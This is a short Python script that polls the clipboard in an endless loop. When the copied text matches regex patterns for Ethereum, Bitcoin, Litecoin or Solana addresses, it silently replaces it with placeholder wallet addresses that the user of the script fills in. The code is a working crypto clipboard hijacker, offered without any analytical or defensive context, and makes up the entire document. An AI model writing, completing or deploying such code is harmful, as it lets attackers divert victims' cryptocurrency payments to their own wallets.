import pyperclip, time, re

adresses = {
    "eth": "YOUR ETH ADRESS",
    "btc": "YOUR BTC ADRESS",
    "ltc": "YOUR LTC ADRESS",
    "sol": "YOUR SOL ADRESS"
}

eth_address_pattern = re.compile(r'^0x[a-fA-F0-9]{40}$')
btc_address_pattern = re.compile(r'^(1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{39,59})$')
ltc_address_pattern = re.compile(r'^(L[a-km-zA-HJ-NP-Z1-9]{25,34}|M[a-km-zA-HJ-NP-Z1-9]{25,34}|ltc1[a-zA-HJ-NP-Z0-9]{39,59})$')
sol_address_pattern = re.compile(r'^[1-9A-HJ-NP-Za-km-z]{32,44}$')


last_content = None
while True:
    current_content = pyperclip.paste().strip()
    if current_content != last_content:
        if eth_address_pattern.match(current_content):
            new_content = adresses["eth"]
        elif btc_address_pattern.match(current_content):
            new_content = adresses["btc"]
        elif ltc_address_pattern.match(current_content):
            new_content = adresses["ltc"]
        elif sol_address_pattern.match(current_content):
            new_content = adresses["sol"]
        else:
            new_content = current_content
        pyperclip.copy(new_content)
        last_content = new_content
